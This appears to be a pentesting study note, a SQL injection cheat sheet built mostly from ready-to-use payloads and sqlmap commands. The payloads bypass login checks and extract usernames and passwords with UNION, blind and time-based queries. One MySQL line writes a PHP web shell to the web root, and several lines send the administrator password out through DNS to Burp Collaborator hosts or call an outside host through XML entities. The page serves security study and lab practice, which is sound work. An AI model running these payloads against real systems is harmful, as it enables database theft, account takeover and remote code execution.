---
layout: default
title: "SQL Injection"
parent: "Web Application"
nav_order: 28
---

# SQL Injection

Resources:
- [Burp Suite SQL Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Rana Kalil Video Playlist](https://www.youtube.com/watch?v=X1X1UdaC_90&list=PLuyTk2_mYISItkbigDRkL9BFpyRenqrRJ)
- [SQLi Cheatsheet (Codingo)](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)

---

## Detection & Testing

Goal: Find injection location and determine the actual SQL query structure.

Test possible injection locations:
```
'
' --
' OR 1=1
' OR 1=1; -- -
'UNION SELECT * FROM users WHERE 1=1; -- -
```

Note: `--` comments out everything after it. Example:
- `username=administrator'--'&password=password123`
- Underlying query: `SELECT x FROM y WHERE username = 'administrator' AND password = 'password123'`
- With injection: comments out the password check, logs in as administrator regardless

### Subverting Application Logic
Original query: `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
- Change user to `admin'--` to end the query early and skip the password check

### Retrieving Hidden Data
Original query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
```
GET /filter?category=gifts → GET /filter?category='+OR+1=1-- HTTP/2
```

---

## UNION-Based Injection

UNION SELECT queries an additional table alongside the intended one.

**Requirements:**
- Individual queries must return the same number of columns
- Data types in each column must be compatible

### Step 1: Determine Number of Columns

Method 1 (ORDER BY):
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- error here means 2 columns
```

Method 2 (UNION SELECT NULL):
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- NULL is convertible to every data type
```

Method 3 (simple ORDER BY):
```sql
$validQuery ORDER BY 1
$validQuery ORDER BY 2
-- increment until error
```

### Step 2: Identify String Columns
```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
-- etc. until you find the string-compatible column
```

### Step 3: Extract Data

Database version:
```sql
UNION ALL SELECT 1, 2, @@version          -- MySQL/MSSQL
SELECT * FROM v$version                    -- Oracle
SELECT version()                           -- PostgreSQL
```

Current user and tables:
```sql
UNION ALL SELECT 1, 2, user()
UNION ALL SELECT 1, 2, table_name FROM information_schema.tables
UNION ALL SELECT 1, 2, column_name FROM information_schema.columns WHERE table_name='users'
UNION ALL SELECT 1, username, password FROM users
```

Retrieving multiple values in a single column (Oracle):
```sql
' UNION SELECT username || '~' || password FROM users--
```

### Step 4: File Read / Write (MySQL)
```sql
UNION ALL SELECT 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
UNION ALL SELECT 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE 'c:/xampp/htdocs/backdoor.php'
-- Test with: $Host/backdoor.php?cmd=$cmd
```

### Information Schema Enumeration
```sql
SELECT table_name FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = '$tablename'

GET /filter?category=%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
GET /filter?category=%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_urcpzb'--
GET /filter?category=%27+UNION+SELECT+username_ktursq,+password_zhuttt+FROM+users_urcpzb--
```

**Oracle-specific:** requires `FROM dual` in every SELECT:
```sql
'+UNION+SELECT+'a',+'a'+FROM+dual--
SELECT banner FROM v$version
'+UNION+SELECT+banner,+'a'+FROM+v$version--
```

---

## Blind SQLi

Application behaves differently based on whether a condition is true or false (no visible output).

### Boolean-Based Blind
```sql
-- Confirm true/false difference
TrackingId=xyz' AND '1'='1    -- true
TrackingId=xyz' AND '1'='2    -- false

-- Confirm table exists
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

-- Confirm user exists
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

-- Enumerate password length
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
-- increment until false

-- Enumerate password characters
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
-- Use Burp Intruder Cluster Bomb: $1 = position, $2 = character
-- Filter for "Welcome back" (or whatever indicates true)
```

Full example cookie format:
```
Cookie: TrackingId=7xoi8QZmDdgTeeS0' AND (SELECT SUBSTRING(password,$1,1) FROM users WHERE username='administrator')='$2
```

### Error-Based Blind
Induce application to return an error only when a condition is true.

```sql
-- CASE-based error trigger (generic)
TrackingId=7xoi8QZmDdgTeeS0' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a   -- error
TrackingId=7xoi8QZmDdgTeeS0' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a   -- no error

-- Enumerate password via error
TrackingId=7xoi8QZmDdgTeeS0' AND (SELECT CASE WHEN (Username='Administrator' AND SUBSTRING(Password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Oracle error-based:
```sql
-- Confirm Oracle (dual table)
TrackingId=BswXnzkEYSSXEdIZ'||(SELECT '' FROM dual)||'
-- Confirm users table
TrackingId=BswXnzkEYSSXEdIZ'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
-- Boolean via error
TrackingId=BswXnzkEYSSXEdIZ'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
-- Enumerate
TrackingId=BswXnzkEYSSXEdIZ'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=BswXnzkEYSSXEdIZ'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

CAST-based error extraction (PostgreSQL):
```sql
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-- Error reveals value: ERROR: invalid input syntax for type integer: "administrator"
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Use `CAST()` to change data types: `CAST((SELECT example_column FROM example_table) AS int)`

### Time-Based Blind
Check for time delay instead of error or different response.

MSSQL:
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
'; IF (SELECT COUNT(Username) FROM Users WHERE Username='Administrator' AND SUBSTRING(Password,1,1)>'m') = 1 WAITFOR DELAY '0:0:{delay}'--
```

PostgreSQL:
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

-- Simple test
TrackingId=x'||pg_sleep(10)--
```

### Out-of-Band (OAST)
Trigger DNS lookups to an attacker-controlled server (useful when no in-band feedback).

MSSQL DNS lookup:
```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Exfiltrate data via DNS (MSSQL):
```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Oracle OAST:
```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://BURPCOLLABORATOR/">%remote;]>'),'/l')+FROM+dual--
```

---

## Filter Bypass Techniques

### XML Encoding
Use HTML/XML entity encoding to obfuscate SQL keywords:
```xml
&#x53;ELECT  instead of  SELECT
```
Decoded server-side before being passed to SQL interpreter.

Full example (XML body injection):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>
        1 <@dec_entities>
            UNION SELECT username || '~' || password FROM users WHERE username = 'administrator'
        </@dec_entities>
    </storeId>
</stockCheck>
```
Note: `dec_entities` is a Hackvertor Burp extension: Extensions > Hackvertor > Encode > dec_entities

---

## Database-Specific Notes

| Database   | Version Query               | Comment Style        | Notes |
|------------|-----------------------------|----------------------|-------|
| MySQL      | `SELECT @@version`          | `-- ` (space required) or `#` | |
| MSSQL      | `SELECT @@version`          | `--`                 | |
| Oracle     | `SELECT * FROM v$version`   | `--`                 | All SELECTs need FROM; use `dual` as dummy table; `ROWNUM = 1` for LIMIT |
| PostgreSQL | `SELECT version()`          | `--`                 | Use `pg_sleep()` for time-based |

---

## Tools

### sqlmap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# With POST data
sqlmap -u "http://target.com/login" --data="user=test&pass=test"

# Dump database
sqlmap -u "http://target.com/page?id=1" --dump

# Specify database
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T tablename --dump

# Burp request file
sqlmap -r request.txt
```
